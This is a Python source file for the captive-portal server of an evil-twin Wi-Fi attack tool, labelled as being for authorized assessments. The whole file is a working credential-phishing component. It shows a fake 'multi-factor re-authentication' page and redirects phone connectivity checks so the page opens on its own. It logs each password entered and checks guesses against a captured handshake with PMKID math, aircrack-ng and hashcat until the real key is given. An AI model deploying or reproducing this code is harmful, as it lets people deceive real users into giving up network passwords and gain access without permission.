"""Captive-portal HTTP server for authorized evil-twin WiFi assessments.

Launched as a subprocess by app.eviltwin. Serves a single, deliberately GENERIC
"network security re-authentication" page — it asks ONLY for the Wi-Fi password
and is NOT a clone of any specific real brand, ISP, or login site. Optionally it
verifies each submitted password against a captured 4-way handshake (aircrack-ng)
so it can tell a real Wi-Fi password from a wrong guess and keep prompting until
the correct one is entered.

For authorized engagements only. The evil-twin AP that drives clients here is
gated on the engagement scope (authorized SSID/BSSID) by the API layer, and the
password verification requires a handshake YOU captured from the in-scope target.
"""

import hashlib
import hmac
import html
import json
import shutil
import subprocess
import sys
import tempfile
import threading
import time
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs

# Must match app.eviltwin.GATEWAY_IP — the address the captive portal is reached
# at, and where we redirect OS connectivity-check probes so the device's captive
# browser opens our page on its own.
GATEWAY_IP = "10.0.0.1"

# Password verification shells out to aircrack-ng / hashcat, which are expensive.
# Serialize it so a burst of submissions (or a device that auto-POSTs) can't spawn
# many crackers at once and exhaust CPU/RAM. The fast pure-Python PMKID path
# handles the common case without ever taking this lock's slow branch for long.
_VERIFY_LOCK = threading.Lock()
# Cap on the POST body we read, so a bogus/huge Content-Length can't balloon memory.
_MAX_BODY = 64 * 1024


# Client-side: intercept submit → show a "Verifying…" spinner while the server
# checks the password against the handshake → on wrong, show inline retry; on
# correct, swap in the success card. Falls back to a normal form POST if fetch
# fails. Defined as a plain string so its many {} braces don't clash with the
# f-strings that build the page.
_PORTAL_JS = """
<script>
(function(){
  var f=document.getElementById('pf');
  if(!f) return;
  var btn=document.getElementById('pb'), err=document.getElementById('pe'), pw=document.getElementById('pw');
  f.addEventListener('submit', function(e){
    e.preventDefault();
    if(err){ err.style.display='none'; }
    btn.disabled=true; btn.innerHTML='<span class="spin"></span>Verifying\\u2026';
    fetch('/?ajax=1',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'password='+encodeURIComponent(pw.value)})
      .then(function(r){ return r.json(); })
      .then(function(d){
        if(d && d.verified===true){
          var c=document.querySelector('.card');
          c.innerHTML='<div class="icon ok">\\u2713</div><h1>You\\u2019re reconnected</h1>'+
                      '<p>Your device has been re-verified. You can close this page and continue browsing.</p>';
        } else {
          if(err){ err.textContent='Incorrect Wi-Fi password. Please try again.'; err.style.display='block'; }
          btn.disabled=false; btn.innerHTML='Verify &amp; reconnect';
          pw.value=''; pw.focus();
        }
      })
      .catch(function(){ f.submit(); });
  });
})();
</script>
"""


def render_page(ssid: str, error: str = "", done: bool = False) -> str:
    """Generic network-security re-authentication page. Intentionally unbranded —
    it impersonates no real company, only a plausible 'this network needs you to
    re-verify' security prompt. Asks for the Wi-Fi password only."""
    # Escape the SSID: it's attacker/environment-controlled (pasted from a scan),
    # so a name with <, >, & or quotes would otherwise mangle the portal HTML.
    net = html.escape(ssid or "this network")
    if done:
        body = f"""
      <div class="icon ok">&#10003;</div>
      <h1>You're reconnected</h1>
      <p>Your device has been re-verified on <strong>{net}</strong>. You can close this page
         and continue browsing.</p>"""
        return _wrap(net, body)

    body = f"""
      <div class="icon"><svg viewBox="0 0 24 24" width="30" height="30" fill="none"
        stroke="#2563eb" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
        <path d="M12 3l7 3v5c0 4.5-3 7.5-7 9-4-1.5-7-4.5-7-9V6l7-3z"/><path d="M9 12l2 2 4-4"/></svg></div>
      <h1>Additional verification required</h1>
      <p>For your security, <strong>{net}</strong> has enabled an extra authentication step
         (multi-factor / MFA) to keep the network protected. To stay connected, please
         re-enter the Wi-Fi password below.</p>
      <div id="pe" class="err" style="{'display:block' if error else 'display:none'}">{error}</div>
      <form id="pf" method="POST" action="/">
        <label for="pw">Wi-Fi password</label>
        <input id="pw" type="password" name="password" autocomplete="off"
               autofocus required placeholder="Network password">
        <button id="pb" type="submit">Verify &amp; reconnect</button>
      </form>
      <div class="foot"><span class="lock">&#128274;</span> Secured network authentication</div>"""
    return _wrap(net, body)


def _wrap(net: str, inner: str) -> str:
    return f"""<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Network security verification</title>
<style>
  * {{ box-sizing:border-box; }}
  body {{ font-family:system-ui,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
         background:linear-gradient(135deg,#eef2f7,#e3e9f2); margin:0; min-height:100vh;
         display:flex; align-items:center; justify-content:center; padding:20px; color:#1f2937; }}
  .card {{ background:#fff; padding:30px 28px; border-radius:16px;
          box-shadow:0 12px 40px rgba(15,23,42,.14); width:100%; max-width:360px; text-align:center; }}
  .icon {{ width:56px; height:56px; border-radius:50%; background:#eff6ff; display:flex;
          align-items:center; justify-content:center; margin:0 auto 14px; }}
  .icon.ok {{ background:#ecfdf5; color:#059669; font-size:30px; font-weight:700; }}
  h1 {{ font-size:19px; margin:0 0 8px; font-weight:650; }}
  p {{ color:#4b5563; font-size:14px; line-height:1.5; margin:0 0 18px; }}
  label {{ display:block; text-align:left; font-size:13px; font-weight:600; margin:0 0 6px; color:#374151; }}
  input {{ width:100%; padding:12px 13px; border:1px solid #d1d5db; border-radius:10px;
          font-size:15px; outline:none; transition:border-color .15s,box-shadow .15s; }}
  input:focus {{ border-color:#2563eb; box-shadow:0 0 0 3px rgba(37,99,235,.15); }}
  button {{ width:100%; margin-top:16px; padding:12px; border:0; border-radius:10px;
           background:#2563eb; color:#fff; font-size:15px; font-weight:650; cursor:pointer;
           transition:background .15s; }}
  button:hover {{ background:#1d4ed8; }}
  button:disabled {{ opacity:.8; cursor:default; background:#1d4ed8; }}
  .spin {{ display:inline-block; width:14px; height:14px; margin-right:8px; vertical-align:-2px;
          border:2px solid rgba(255,255,255,.45); border-top-color:#fff; border-radius:50%;
          animation:spin .7s linear infinite; }}
  @keyframes spin {{ to {{ transform:rotate(360deg); }} }}
  .err {{ background:#fef2f2; color:#b91c1c; border:1px solid #fecaca; border-radius:9px;
         padding:9px 11px; font-size:13px; margin-bottom:14px; text-align:left; }}
  .foot {{ margin-top:18px; font-size:12px; color:#9ca3af; }}
  .lock {{ font-size:12px; }}
</style></head>
<body><div class="card">{inner}</div>{_PORTAL_JS}</body></html>"""


def record_submission(creds_path: Path, client: str, fields: dict, verified=None) -> dict:
    """Append one captured submission as a JSON line. `verified` is True (password
    confirmed against the handshake), False (wrong guess), or None (couldn't verify
    — capture-only). Returns the record."""
    record = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "client": client,
        "fields": fields,
        "verified": verified,
    }
    with open(creds_path, "a", encoding="utf-8") as fh:
        fh.write(json.dumps(record) + "\n")
    return record


def _verify_pmkid_python(hc22000: str, password: str):
    """FAST pure-Python PMKID check — no subprocess, ~10ms. Most hcxdumptool
    captures are PMKID (WPA*01*…), so this answers instantly. True (match) /
    False (PMKID present, wrong) / None (no PMKID lines → caller tries aircrack
    for a 4-way handshake). PMKID = HMAC-SHA1(PMK, "PMK Name"|AP|STA)[:16]."""
    try:
        lines = Path(hc22000).read_text(errors="replace").splitlines()
    except OSError:
        return None
    pw = password.encode()
    saw = False
    for ln in lines:
        p = ln.strip().split("*")
        # WPA*01*<pmkid>*<mac_ap>*<mac_sta>*<essid_hex>*...
        if len(p) < 6 or p[0].upper() != "WPA" or p[1] != "01":
            continue
        try:
            pmkid = p[2].lower()
            mac_ap = bytes.fromhex(p[3])
            mac_sta = bytes.fromhex(p[4])
            essid = bytes.fromhex(p[5])
        except ValueError:
            continue
        saw = True
        pmk = hashlib.pbkdf2_hmac("sha1", pw, essid, 4096, 32)
        calc = hmac.new(pmk, b"PMK Name" + mac_ap + mac_sta, hashlib.sha1).digest()[:16]
        if calc.hex() == pmkid:
            return True
    return False if saw else None


def _write_candidate(password: str) -> Path:
    tmp = Path(tempfile.mkdtemp(prefix="etverify_"))
    wl = tmp / "candidate.txt"
    wl.write_text(password + "\n")
    return wl


def _aircrack_verify(pcapng: str, bssid: str, wl: Path):
    """True (correct) / False (handshake present, wrong) / None (no usable
    4-way handshake for this BSSID — caller should try hashcat)."""
    try:
        proc = subprocess.run(
            ["aircrack-ng", "-a", "2", "-b", bssid, "-w", str(wl), pcapng],
            capture_output=True, text=True, timeout=60,
        )
    except (OSError, subprocess.SubprocessError):
        return None
    out = (proc.stdout + proc.stderr).lower()
    if "key found" in out:
        return True
    if "no valid wpa handshakes" in out or "no matching network" in out or "quitting aircrack" in out:
        return None
    return False  # aircrack loaded a handshake and the key wasn't it → wrong


def _hashcat_verify(hc22000: str, wl: Path):
    """Fallback for hcxdumptool captures (PMKID or handshake) that aircrack can't
    read. True / False (ran, not this key) / None (couldn't load hashes)."""
    out = wl.parent / "cracked.txt"
    try:
        proc = subprocess.run(
            ["hashcat", "-m", "22000", "-a", "0", "--potfile-disable", "--force",
             "--quiet", "-o", str(out), hc22000, str(wl)],
            capture_output=True, text=True, timeout=120,
        )
    except (OSError, subprocess.SubprocessError):
        return None
    if out.exists() and out.read_text(errors="replace").strip():
        return True
    o = (proc.stdout + proc.stderr).lower()
    if "no hashes loaded" in o or "no such file" in o or "separator unmatched" in o:
        return None
    return False


def verify_password(pcapng: str, hc22000: str, bssid: str, password: str):
    """Is `password` the real Wi-Fi key for `bssid`? True (yes) / False (no) /
    None (can't verify — no usable handshake). Tries aircrack-ng on the .pcapng
    first (fast, for a real 4-way handshake), then falls back to hashcat mode
    22000 on the .hc22000 (handles PMKID-only hcxdumptool captures)."""
    if not (8 <= len(password) <= 63):  # WPA-PSK length bounds → definitely wrong
        return False
    # FAST path first: pure-Python PMKID check (no subprocess, ~10ms). Stays
    # concurrent — it's cheap and answers most hcxdumptool captures instantly.
    if hc22000 and Path(hc22000).exists():
        r = _verify_pmkid_python(hc22000, password)
        if r is not None:
            return r
    # Expensive fallback (aircrack/hashcat subprocesses): serialize so concurrent
    # submissions can't spawn a pile of crackers, and clean up the candidate temp.
    with _VERIFY_LOCK:
        wl = _write_candidate(password)
        try:
            # 4-way handshake: aircrack on the pcapng (fast when a real handshake exists).
            if pcapng and Path(pcapng).exists() and bssid:
                r = _aircrack_verify(pcapng, bssid, wl)
                if r is not None:
                    return r
            # last resort: hashcat on the .hc22000 (slow startup).
            if hc22000 and Path(hc22000).exists():
                return _hashcat_verify(hc22000, wl)
            return None
        finally:
            shutil.rmtree(wl.parent, ignore_errors=True)  # throwaway candidate dir


def portal_command(port: int, creds_path: Path, ssid: str, bssid: str = "", pcapng: str = "", hc22000: str = "") -> list[str]:
    """argv to launch this portal server as a subprocess, working both from source
    (`python -m app.portal ...`) and from a PyInstaller-frozen binary
    (`<exe> --portal ...`, dispatched by run_server.main). bssid+pcapng/hc22000
    enable real password verification against the captured handshake/PMKID."""
    args = [str(port), str(creds_path), ssid, bssid, pcapng, hc22000]
    if getattr(sys, "frozen", False):
        return [sys.executable, "--portal", *args]
    return [sys.executable, "-m", "app.portal", *args]


def read_captured(creds_path: Path) -> list[dict]:
    if not creds_path.exists():
        return []
    out = []
    for line in creds_path.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            out.append(json.loads(line))
        except json.JSONDecodeError:
            continue
    return out


def has_accepted(creds_path: Path) -> bool:
    """True ONLY once a password has been VERIFIED correct against the captured
    handshake — that alone stops the attack. A wrong guess (False) and an
    unverifiable submission (None, no handshake) do NOT count, so a wrong password
    can never stop the attack — it keeps running until the real one is entered."""
    return any(r.get("verified") is True for r in read_captured(creds_path))


def _build_handler(creds_path: Path, ssid: str, bssid: str, pcapng: str, hc22000: str):
    verify_enabled = bool(bssid and ((pcapng and Path(pcapng).exists()) or (hc22000 and Path(hc22000).exists())))

    class Handler(BaseHTTPRequestHandler):
        def _send_html(self, html: str):
            body = html.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(body)

        def _send_json(self, obj: dict):
            body = json.dumps(obj).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):  # noqa: N802
            # Force the captive portal open WITHOUT the user doing anything: phones
            # silently hit an OS connectivity-check URL (Android /generate_204,
            # Apple /hotspot-detect.html, Windows /connecttest.txt, …). Answering
            # those probes with a 302 to our page — instead of the "you have
            # internet" response they expect — makes the OS auto-launch its captive
            # browser straight onto the portal. The portal root itself serves the
            # actual page.
            path = self.path.split("?", 1)[0]
            if path in ("/", "/portal", "/index.html"):
                self._send_html(render_page(ssid))
            else:
                self.send_response(302)
                self.send_header("Location", f"http://{GATEWAY_IP}/")
                self.send_header("Cache-Control", "no-store")
                self.send_header("Content-Length", "0")
                self.end_headers()

        def do_POST(self):  # noqa: N802
            try:
                length = int(self.headers.get("Content-Length", 0) or 0)
            except ValueError:
                length = 0
            length = max(0, min(length, _MAX_BODY))  # cap so a huge body can't balloon memory
            raw = self.rfile.read(length).decode("utf-8", "replace") if length else ""
            fields = {k: v[0] for k, v in parse_qs(raw).items()}
            password = fields.get("password", "")
            is_ajax = "ajax=1" in (self.path.split("?", 1)[1] if "?" in self.path else "")

            # Phones probe the captive portal repeatedly (and some auto-POST it) with
            # NO password — that's not a real attempt. Ignore blanks: don't record
            # them (no "wrong (blank)" spam in the operator's log) and just re-serve
            # the form. Only real, non-empty submissions count.
            if not password.strip():
                if is_ajax:
                    self._send_json({"verified": None, "ignored": True})
                else:
                    self._send_html(render_page(ssid))
                return

            verified = verify_password(pcapng, hc22000, bssid, password) if verify_enabled else None
            record_submission(creds_path, self.client_address[0], fields, verified)

            # The interactive button submits with ?ajax=1 and wants JSON back so it
            # can show its spinner and an inline retry without a full page reload.
            if is_ajax:
                self._send_json({"verified": verified})
                return

            # No-JS fallback: full page re-render.
            if verified is True:
                self._send_html(render_page(ssid, done=True))
            else:
                self._send_html(render_page(ssid, error="Incorrect Wi-Fi password. Please try again."))

        def log_message(self, *args):  # silence default stderr logging
            pass

    return Handler


def main():
    port = int(sys.argv[1])
    creds_path = Path(sys.argv[2])
    ssid = sys.argv[3] if len(sys.argv) > 3 else ""
    bssid = sys.argv[4] if len(sys.argv) > 4 else ""
    pcapng = sys.argv[5] if len(sys.argv) > 5 else ""
    hc22000 = sys.argv[6] if len(sys.argv) > 6 else ""
    # Bind to the captive-portal gateway address only — NOT 0.0.0.0. Clients reach
    # it at GATEWAY_IP (iptables REDIRECTs their :80 here), so binding wider would
    # only needlessly expose the portal (and its expensive verify endpoint) on the
    # operator's other networks. The caller assigns GATEWAY_IP to the AP interface
    # just before launching us, so retry briefly in case it isn't up quite yet.
    handler = _build_handler(creds_path, ssid, bssid, pcapng, hc22000)
    server = None
    for _ in range(20):  # ~10s
        try:
            server = ThreadingHTTPServer((GATEWAY_IP, port), handler)
            break
        except OSError:
            time.sleep(0.5)
    if server is None:
        server = ThreadingHTTPServer((GATEWAY_IP, port), handler)  # final try: surface the error
    server.serve_forever()


if __name__ == "__main__":
    main()
